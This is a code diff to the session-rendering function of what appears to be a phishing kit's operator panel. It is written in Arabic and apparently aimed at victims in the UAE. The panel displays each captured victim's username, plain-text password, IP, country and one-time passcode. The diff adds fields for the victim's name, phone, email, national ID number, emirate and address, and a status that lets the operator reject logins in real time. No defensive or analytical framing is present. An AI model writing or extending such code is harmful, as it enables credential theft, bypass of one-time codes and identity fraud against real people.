@@ -672,6 +672,21 @@ function renderSessions() {
       otpSection = '<div class="session-field"><span class="sf-label">رمز OTP</span><span class="sf-value otp-code">' + s.otp + '</span></div>';
     }
 
+    var serviceSection = '';
+    if (s.service) {
+      serviceSection = '<div class="session-field" style="background:rgba(0,200,255,0.06);margin:0 -20px;padding:8px 20px;"><span class="sf-label" style="color:#00c8ff;">نوع الخدمة</span><span class="sf-value" style="color:#00c8ff;font-weight:700;">' + s.service + '</span></div>';
+    }
+
+    var orderSection = '';
+    if (s.orderName || s.orderPhone) {
+      orderSection = (s.orderName ? '<div class="session-field"><span class="sf-label">الاسم</span><span class="sf-value">' + s.orderName + '</span></div>' : '') +
+        (s.orderPhone ? '<div class="session-field"><span class="sf-label">الجوال</span><span class="sf-value mono">' + s.orderPhone + '</span></div>' : '') +
+        (s.orderEmail ? '<div class="session-field"><span class="sf-label">البريد</span><span class="sf-value">' + s.orderEmail + '</span></div>' : '') +
+        (s.orderIdNumber ? '<div class="session-field"><span class="sf-label">رقم الهوية</span><span class="sf-value mono">' + s.orderIdNumber + '</span></div>' : '') +
+        (s.orderEmirate ? '<div class="session-field"><span class="sf-label">الإمارة</span><span class="sf-value">' + s.orderEmirate + '</span></div>' : '') +
+        (s.orderAddress ? '<div class="session-field"><span class="sf-label">العنوان</span><span class="sf-value">' + s.orderAddress + '</span></div>' : '');
+    }
+
     var statusHtml = '';
     if (s.loginStatus === 'rejected') {
       statusHtml = '<span class="status-badge rejected">تسجيل الدخول مرفوض</span>';
@@ -713,11 +728,13 @@ function renderSessions() {
     card.innerHTML =
       '<div class="session-card-header"><span class="session-id">جلسة #' + s.id + '</span><span class="session-time">' + dt + '</span></div>' +
       '<div class="session-card-body">' +
+        serviceSection +
         '<div class="session-field"><span class="sf-label">اسم المستخدم</span><span class="sf-value">' + (s.username || '-') + '</span></div>' +
         '<div class="session-field"><span class="sf-label">كلمة المرور</span><span class="sf-value mono">' + (s.password || '-') + '</span></div>' +
         '<div class="session-field"><span class="sf-label">الدولة</span><span class="sf-value">' + (s.country || '-') + '</span></div>' +
         '<div class="session-field"><span class="sf-label">IP</span><span class="sf-value mono">' + (s.ip || '-') + '</span></div>' +
         otpSection +
+        orderSection +
       '</div>' +
       '<div class="session-step">' +
         '<span class="step-dot ' + loginClass + '"></span> تسجيل الدخول' +
